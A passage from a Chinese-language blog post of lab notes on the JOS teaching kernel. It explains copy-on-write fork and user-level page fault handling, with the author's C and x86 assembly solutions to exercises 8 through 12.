SYS_page_alloc:</span><br><span class="line">    <span class="comment">// call sys_page_alloc</span></span><br><span class="line">    <span class="keyword">return</span> sys_page_alloc((<span class="keyword">envid_t</span>)a1, (<span class="keyword">void</span> *)a2, (<span class="keyword">int</span>)a3);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> SYS_page_map:</span><br><span class="line">    <span class="comment">// call sys_page_map</span></span><br><span class="line">    <span class="keyword">return</span> sys_page_map((<span class="keyword">envid_t</span>)a1, (<span class="keyword">void</span> *)a2, (<span class="keyword">envid_t</span>)a3, (<span class="keyword">void</span> *)a4,</span><br><span class="line">                        (<span class="keyword">int</span>)a5);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> SYS_page_unmap:</span><br><span class="line">    <span class="comment">// call sys_page_unmap</span></span><br><span class="line">    <span class="keyword">return</span> sys_page_unmap((<span class="keyword">envid_t</span>)a1, (<span class="keyword">void</span> *)a2);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
<h3 id="第二部分-Copy-on-Write-Fork-写时复制Fork"><a href="#第二部分-Copy-on-Write-Fork-写时复制Fork" class="headerlink" title="第二部分 Copy-on-Write Fork - 写时复制Fork"></a>第二部分 Copy-on-Write Fork - 写时复制Fork</h3><p>Unix提供了一个<code>fork()</code>系统调用作为其原始的进程创建原语。<code>fork()</code>系统调用将调用进程的整个地址空间拷贝以创建子进程。</p>
<p>xv6通过将父进程页中的所有数据复制到子进程中的新页中来实现<code>fork()</code>，这本质上就是<code>dumbfowk()</code>采用的方法。对于父进程地址空间的拷贝是整个<code>fork()</code>操作中最“贵”的部分。</p>
<p>然而，对于fork()的调用通常紧跟着一个对子进程的<code>exec()</code>系统调用，该系统调用用一个新程序替换子进程的内存，这就是一个典型的shell所做的。在这种情况下，花费的用于复制父进程的地址空间的时间是被浪费的，因为子进程在调用<code>exec()</code>前只会使用很少的内存。</p>
<p>出于以上的原因，Unix之后的版本利用了虚拟内存硬件去允许父进程和子进程共享映射到各自地址空间的内存，直到其中一个进程实际修改为止。该技术又被称作写时复制。<br>为了实现写时复制，在<code>fork()</code>中内核仅仅从父进程拷贝地址的映射而非实际映射的页面到子进程，并且在同时将共享的页面标记为只读。<br>当两个进程之一尝试写入其中一个共享页面时，该过程触发页面错误。<br>内核意识到该页面实际上是一个“虚拟”或是“写时复制”页面，所以其会创建一个错误页面的新的，私有的，可写的页副本。<br>通过这种方式，直到实际写入时，独立页面的内容才被复制。<br>该过程使得紧接着<code>exec()</code>的<code>fork()</code>调用更加节约：子进程在调用<code>exec()</code>很可能只会复制一页（栈的当前页）。</p>
<p>本实验的下一个部分要求完成一个合适的类Unix的<code>fork()</code>的写时复制的实现（作为用户空间库例程）。在用户空间实现<code>fork()</code>并且支持写时复制使得内核能保留相对简洁，因此更不容易出现严重的错误。这同样可以允许独立的用户模式程序实现自己的<code>fork()</code>语义。</p>
<h4 id="用户级别的页错误处理"><a href="#用户级别的页错误处理" class="headerlink" title="用户级别的页错误处理"></a>用户级别的页错误处理</h4><p>用户级别的写时复制<code>fork()</code>实现需要知道写保护页面的页错误。写时复制只是用户级别的页错误处理的诸多可能用处之一。</p>
<p>通常的做法是设置一个地址空间以便页错误指示何时需要采取某些行动。大多数Unix内核通常只会为新进程的栈区域分配一页，随着进程栈逐渐增长直至访问到了还未被映射的栈地址，触发页错误，然后内核会“按需”分配更多的栈页面。<br>典型的Unix内核必须追踪进程的空间中的不同区域发生页错误时所采取的行动。栈区域的页错误通常会导致新页的分配和映射。BSS区域的页错误通常会导致分配一个新页，填充0，并映射。对于具有按需分页的可执行文件的系统，text段的页错误会导致内核从磁盘上的二进制文件读取相应的页面并映射。</p>
<p>内核需要追踪大量的信息。与传统的Unix方法不同，本实验需要用户决定如何处理用户空间中的每个页面错误，而这些错误的损害通常不大。这种设计还为程序定义存储区域带来了极大的灵活性。之后将会应用用户级别的错误处理程序来映射和访问基于磁盘的文件系统上的文件。</p>
<h5 id="设置页错误处理程序"><a href="#设置页错误处理程序" class="headerlink" title="设置页错误处理程序"></a>设置页错误处理程序</h5><p>为了处理用户环境自己的页错误，用户环境必须向JOS内核注册一个页错误处理程序入口。用户环境通过<code>sys_env_set_pgfault_upcall()</code>的“上行”系统调用注册自己的错误处理程序入口。已经向<code>struct Env</code>添加了新的域<code>env_pgfault_upcall</code>来记录该信息。</p>
<p>练习8的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In sys_env_set_pgfault_upcall():</span></span><br><span class="line"><span class="comment">// Set the page fault upcall for 'envid' by modifying the corresponding struct</span></span><br><span class="line"><span class="comment">// Env's 'env_pgfault_upcall' field.  When 'envid' causes a page fault, the</span></span><br><span class="line"><span class="comment">// kernel will push a fault record onto the exception stack, then branch to</span></span><br><span class="line"><span class="comment">// 'func'.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//  -E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//      or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sys_env_set_pgfault_upcall</span><span class="params">(<span class="keyword">envid_t</span> envid, <span class="keyword">void</span> *func)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env</span>;</span></span><br><span class="line">    <span class="comment">// check and translate the envid</span></span><br><span class="line">    <span class="keyword">if</span> (envid2env(envid, &amp;env, <span class="literal">true</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// envid not exist or permission error</span></span><br><span class="line">        <span class="keyword">return</span> -E_BAD_ENV;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set func</span></span><br><span class="line">    env-&gt;env_pgfault_upcall = func;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("sys_env_set_pgfault_upcall not implemented");</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In syscall():</span></span><br><span class="line"><span class="comment">// new code added</span></span><br><span class="line"><span class="keyword">case</span> SYS_env_set_pgfault_upcall:</span><br><span class="line">    <span class="comment">// call sys_env_set_pgfault_upcall</span></span><br><span class="line">    <span class="keyword">return</span> sys_env_set_pgfault_upcall((<span class="keyword">envid_t</span>)a1, (<span class="keyword">void</span> *)a2);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
<h5 id="用户环境中的正常栈和异常栈"><a href="#用户环境中的正常栈和异常栈" class="headerlink" title="用户环境中的正常栈和异常栈"></a>用户环境中的正常栈和异常栈</h5><p>在正常执行时，JOS中的用户环境会在正常栈中执行：正常栈的ESP寄存器指向USTACKTOP，并且压入的栈数据会存放于USTACKTOP - PGSIZE到USTACKTOP - 1的闭区域。<br>然而，当一个页错误在用户模式发生时，内核将重启用户环境，在一个另外的栈上运行一个特定的用户级别的页错误处理程序，该栈被称为用户异常栈。<br>实际上，将使JOS代表用户环境自动执行“栈切换”，就像x86处理器在用户模式转换到内核模式时已经代表JOS实现了栈切换一样。</p>
<p>JOS用户异常栈的大小也为一个页面大，栈顶被定义为指向虚拟地址UXSTACKTOP，用户异常栈的有效字节为UXSTACKTOP - PGSIZE到UXSTACKTOP - 1的闭区域。<br>当运行于异常栈上时，用户级别的页错误处理程序可以使用JOS的常规系统调用映射新的页或是调整页映射以修复任何可能导致页错误的问题。<br>然后用户级别的页错误处理程序通过汇编语言存根返回至原始栈上的错误代码处。</p>
<p>每一个想要支持用户级别页错误处理程序的用户环境需要自己为其异常栈通过<code>sys_page_alloc()</code>分配内存。</p>
<h5 id="唤醒用户页错误处理程序"><a href="#唤醒用户页错误处理程序" class="headerlink" title="唤醒用户页错误处理程序"></a>唤醒用户页错误处理程序</h5><p>现在需要改变<code>kern/trap.c</code>中的页错误处理程序按特定的方式处理用户模式的页错误。<br>将错误时的用户环境状态叫做陷阱时状态。</p>
<p>若是没有页面错误处理函数被注册，则JOS内核会和之前一样，摧毁用户环境并输出一条消息。否则，内核会在异常栈设置在<code>inc/trap.h</code>中如<code>struct UTrapFrame</code>定义的陷阱帧。</p>
<p>然后内核会安排用户环境以页错误处理程序以上述栈帧在异常栈上恢复执行。<code>fault_va</code>是导致也错误的虚拟地址。</p>
<p>如果当异常发生时用户环境已经在用户异常栈上运行，则错误处理程序自身发生了错误。在这种情况下，你应当在当前的<code>tf-&gt;tf_esp</code>中而非UXSTACKTOP中重新启动栈帧。你应当首先压入一个4字节的字，然后一个<code>struct UTrapFrame</code>。</p>
<p>检查tf-&gt;tf_esp是否在UXSTACKTOP - PGSIZE到UXSTACKTOP - 1的闭区间内来判断其是否已经在用户异常栈上。</p>
<p>练习9中遇到的问题：</p>
<ul>
<li><code>curenv</code>已经被重新定义为<code>thiscpu-&gt;cpu_env</code>，因此可以使用</li>
<li>判断tf-&gt;tf_esp的if语句中，将与写成了或</li>
</ul>
<p>练习9的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In trap.c, page_fault_handler():</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">UTrapframe</span> *<span class="title">utf</span>;</span></span><br><span class="line"><span class="keyword">uintptr_t</span>          utf_addr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check tf-&gt;tf_esp's location to calculate utf's address</span></span><br><span class="line"><span class="keyword">if</span> ((tf-&gt;tf_esp &gt;= UXSTACKTOP - PGSIZE) &amp;&amp; (tf-&gt;tf_esp &lt; UXSTACKTOP)) &#123;</span><br><span class="line">    <span class="comment">// recursive case</span></span><br><span class="line">    <span class="comment">// reason why here needs to substract a 4-byte word</span></span><br><span class="line">    <span class="comment">// is to reserve space for reset eip/esp</span></span><br><span class="line">    utf_addr = tf-&gt;tf_esp - <span class="keyword">sizeof</span>(struct UTrapframe) - <span class="number">4</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// non-recursive case, set utf_addr to the top of</span></span><br><span class="line">    <span class="comment">// user exception stack</span></span><br><span class="line">    utf_addr = UXSTACKTOP - <span class="keyword">sizeof</span>(struct UTrapframe);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (curenv-&gt;env_pgfault_upcall) &#123;</span><br><span class="line">    <span class="comment">// page fault upcall exist</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// use mem assert to check environment allocates the exception</span></span><br><span class="line">    <span class="comment">// stack and has write permission to it, and stack ISN'T overflow</span></span><br><span class="line">    <span class="comment">// combine three case with only one user_mem_assert to check utf_addr</span></span><br><span class="line">    <span class="comment">// NB: curenv HAS been redefined as thiscpu-&gt;cpu_env</span></span><br><span class="line">    user_mem_assert(curenv, (<span class="keyword">void</span> *)utf_addr, <span class="keyword">sizeof</span>(struct UTrapframe),</span><br><span class="line">                    PTE_U | PTE_W | PTE_P);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set user stack frame</span></span><br><span class="line">    utf               = (struct UTrapframe *)utf_addr;</span><br><span class="line">    utf-&gt;utf_fault_va = fault_va;</span><br><span class="line">    utf-&gt;utf_err      = tf-&gt;tf_err;</span><br><span class="line">    utf-&gt;utf_regs     = tf-&gt;tf_regs;</span><br><span class="line">    utf-&gt;utf_eip      = tf-&gt;tf_eip;</span><br><span class="line">    utf-&gt;utf_eflags   = tf-&gt;tf_eflags;</span><br><span class="line">    utf-&gt;utf_esp      = tf-&gt;tf_esp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// modify stack frame to set entry for env_pgfault_upcall</span></span><br><span class="line">    <span class="comment">// and set address for user exception stack</span></span><br><span class="line">    tf-&gt;tf_eip = (<span class="keyword">uintptr_t</span>)curenv-&gt;env_pgfault_upcall;</span><br><span class="line">    tf-&gt;tf_esp = utf_addr;</span><br><span class="line"></span><br><span class="line">    env_run(curenv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h5 id="用户模式页错误入口"><a href="#用户模式页错误入口" class="headerlink" title="用户模式页错误入口"></a>用户模式页错误入口</h5><p>然后需要实现汇编例程，该例程调用C页错误处理程序，然后在恢复在原始的错误指令处的执行。该例程就是被<code>sys_env_set_pgfault_upcall()</code>注册的例程。</p>
<p>最后需要在C用户库实现用户模式的页错误处理机制。</p>
<p>练习10中遇到的问题：</p>
<ul>
<li>需要想清楚思路，即先将eip“压入”陷阱时栈中，使用一个sub后接一个mov指令来模拟该压栈过程，若为递归过程，则会将eip填入之前留下的空白。然后依次恢复寄存器以及eflags。最后pop %esp以切换栈并调用ret返回</li>
</ul>
<p>练习10的代码如下，仅供参考：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// <span class="keyword">In</span> pfentry.S:</span><br><span class="line">// LAB <span class="number">4</span>: Your code here.</span><br><span class="line">// <span class="keyword">push</span> trap-time %eip to trap-time stack</span><br><span class="line">// <span class="keyword">mov</span> utf_eip to %eax</span><br><span class="line">movl <span class="number">0x28</span>(%esp), %eax</span><br><span class="line">// use <span class="keyword">sub</span> <span class="keyword">and</span> <span class="keyword">mov</span> to *simulate* <span class="keyword">push</span></span><br><span class="line">subl <span class="number">$0</span>x4, <span class="number">0x30</span>(%esp)</span><br><span class="line">movl <span class="number">0x30</span>(%esp), %ebp</span><br><span class="line">movl %eax, (%ebp)</span><br><span class="line">// <span class="keyword">pop</span> the unused fault_va <span class="keyword">and</span> err</span><br><span class="line">popl %eax</span><br><span class="line">popl %eax</span><br><span class="line"></span><br><span class="line">// Restore the trap-time registers.  After you <span class="built_in">do</span> this, you</span><br><span class="line">// can no longer modify any general-purpose registers.</span><br><span class="line">// LAB <span class="number">4</span>: Your code here.</span><br><span class="line">popal</span><br><span class="line"></span><br><span class="line">// Restore eflags from the stack.  After you <span class="built_in">do</span> this, you can</span><br><span class="line">// no longer use arithmetic operations <span class="keyword">or</span> anything else that</span><br><span class="line">// modifies eflags.</span><br><span class="line">// LAB <span class="number">4</span>: Your code here.</span><br><span class="line">addl <span class="number">$0</span>x4, %esp</span><br><span class="line">popfl</span><br><span class="line"></span><br><span class="line">// Switch back to the adjusted trap-time stack.</span><br><span class="line">// LAB <span class="number">4</span>: Your code here.</span><br><span class="line">popl %esp</span><br><span class="line"></span><br><span class="line">// Return to re-execute the instruction that faulted.</span><br><span class="line">// LAB <span class="number">4</span>: Your code here.</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
<p>练习11中遇到的问题：</p>
<ul>
<li>注意描述，要使用<code>_pgfault_upcall()</code>（汇编例程包装）来注册用户页处理函数而非传入的那个函数</li>
</ul>
<p>练习11的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In set_pgfault_handler():</span></span><br><span class="line"><span class="keyword">if</span> (_pgfault_handler == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// First time through!</span></span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="comment">// alloc one page for user exception stack</span></span><br><span class="line">    <span class="comment">// and register user-level page fault upcall</span></span><br><span class="line">    <span class="keyword">if</span> (sys_page_alloc(thisenv-&gt;env_id, (<span class="keyword">void</span> *)(UXSTACKTOP - PGSIZE),</span><br><span class="line">                       PTE_U | PTE_W | PTE_P) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">"failed to alloc page for user exception stack!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sys_env_set_pgfault_upcall(thisenv-&gt;env_id, _pgfault_upcall) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">"failed to register page fault upcall!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("set_pgfault_handler not implemented");</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>faultalloc能成功而faultallocbad失败的原因在于faultallocbad直接使用系统调用输出，该输出会使用先使用内存检查而失败；而faultalloc使用了用户库中的<code>cprintf</code>，该函数在使用系统调用输出之前已经尝试对错误地址进行了解引用，触发了用户级别的缺页错误，在实际执行系统调用时，错误的地址已经被分配了页面，因此能通过内存检查。</p>
<h4 id="实现写时复制"><a href="#实现写时复制" class="headerlink" title="实现写时复制"></a>实现写时复制</h4><p>已经拥有了在用户空间中完整实现写时复制<code>fork()</code>的内核设施基础。</p>
<p>现在已经在<code>lib/fork.c</code>中给出了<code>fork()</code>的框架。同<code>dumbfork()</code>相似，<code>fork()</code>首先创建了一个新环境，然后扫描父进程的地址空间并在子进程中建立相同的页映射。核心区别在于<code>dumbfork()</code>复制页，而<code>fork()</code>只实现页映射的复制。<code>fork()</code>直到某环境尝试写时在复制对应的页。</p>
<p><code>fork()</code>的基本控制流为：</p>
<ol>
<li>父进程设置<code>pgfault()</code>作为C级别的页错误处理程序，使用实现了的<code>set_pgfault_handler()</code>函数</li>
<li>父进程调用<code>sys_exofork()</code>去创建子环境</li>
<li>对于地址空间中每一个在UTOP下的可写的或是写时复制的页面，父进程调用<code>duppage()</code>，该函数将该页面以写时复制映射进子进程然后在父进程的地址空间中重新映射该页面为写时复制（顺序很重要）。<code>duppage()</code>同时设置PTE，所以页面将不可写。通过avail域的PTE_COW区分写时复制页面和真正的只读页面。然而，异常栈却不按该方式重映射。需要为子进程分配一个新页面作为异常栈。由于页处理程序实际执行了页复制并且页处理程序运行于异常栈上，异常栈不能写时复制。<code>fork()</code>也需要处理存在但既不是写时复制也不是可写的页面。</li>
<li>父进程为子进程设置用户页错误入口。</li>
<li>子进程已经准备好运行了，有父进程将其标记为可运行。</li>
</ol>
<p>每一次环境尝试向一个还不可写的写时复制的页面写入时，将出现页错误，用户页错误处理程序的控制流为：</p>
<ol>
<li>内核将页错误传递给页错误上行调用，即调用了<code>fork()</code>的页错误处理程序。</li>
<li><code>pgfault()</code>检查错误为写入导致并且相应页面的PTE被标记为写时复制，否则使内核恐慌。</li>
<li><code>pgfault()</code>分配一个新的页面，映射至一个临时位置，然后复制错误页面的内容到新分配的页面，最后将新页面以读写权限映射到合适的地址，替代旧的只读页。</li>
</ol>
<p>用户级别的<code>lib/fork.c</code>代码必须查询环境的页表（如查询某页面的PTE被标记为写时复制）。内核将环境的页表映射在UVPT正是为了这个目的。内核通过将页目录的指针指向自己的映射技巧使得可以为用户代码快速查找PTEs，<code>lib/entry.S</code>已经设置了<code>uvpd</code>和<code>uvpd</code>，你可以快速在<code>lib/fork.c</code>中查找页表信息。</p>
<p>练习12中遇到的问题：</p>
<ul>
<li>注意在<code>pgfault()</code>和<code>duppage()</code>中，必须使用0而不是<code>thisenv-&gt;env_id</code>，原因已经在代码注释中标出</li>
<li>在<code>fork()</code>中需要显式地判断用户异常页并跳过<code>duppage()</code></li>
<li>阅读给出的uvpt技巧，需要在代码中使用</li>
<li>为了简化错误处理，避免重复代码，使用了<code>goto</code></li>
<li>假定先将父进程的用户栈标记为COW，然后再尝试将子进程的用户栈标记为COW之前，可能会出现父进程的用户栈已经被写入的情况而触发缺页错误，因此<code>fork()</code>会立刻分配新页，拷贝内容并重新映射。子进程被标记COW时复制的页映射已经不是原来的页映射了，因此，后来对父进程做的改动会反映在子进程上，这显然是错误的</li>
<li>fork后必须修改thisenv的值以保证用户程序行为正确</li>
</ul>
<p>练习12的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In lib/fork.c, fork():</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// User-level fork with copy-on-write.</span></span><br><span class="line"><span class="comment">// Set up our page fault handler appropriately.</span></span><br><span class="line"><span class="comment">// Create a child.</span></span><br><span class="line"><span class="comment">// Copy our address space and page fault handler setup to the child.</span></span><br><span class="line"><span class="comment">// Then mark the child as runnable and return.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns: child's envid to the parent, 0 to the child, &lt; 0 on error.</span></span><br><span class="line"><span class="comment">// It is also OK to panic on error.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//   Use uvpd, uvpt, and duppage.</span></span><br><span class="line"><span class="comment">//   Remember to fix "thisenv" in the child process.</span></span><br><span class="line"><span class="comment">//   Neither user exception stack should ever be marked copy-on-write,</span></span><br><span class="line"><span class="comment">//   so you must allocate a new page for the child's user exception stack.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">envid_t</span> fork(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use set_pgfault_handler to install pgfault() as page fault handler</span></span><br><span class="line">    set_pgfault_handler(pgfault);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use system call to create new blank child environment</span></span><br><span class="line">    <span class="keyword">envid_t</span> child_env_id = sys_exofork();</span><br><span class="line">    <span class="keyword">if</span> (child_env_id == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// must update thisenv to make sure user program behave</span></span><br><span class="line">        <span class="comment">// normally</span></span><br><span class="line">        thisenv = envs + ENVX(sys_getenvid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (child_env_id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// error when create new environment, simply return</span></span><br><span class="line">        <span class="keyword">return</span> child_env_id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// traverse through parent's address space and use duppage</span></span><br><span class="line">    <span class="comment">// to copy address mappings</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> addr;</span><br><span class="line">    <span class="keyword">for</span> (addr = <span class="number">0</span>; addr &lt; UTOP; addr += 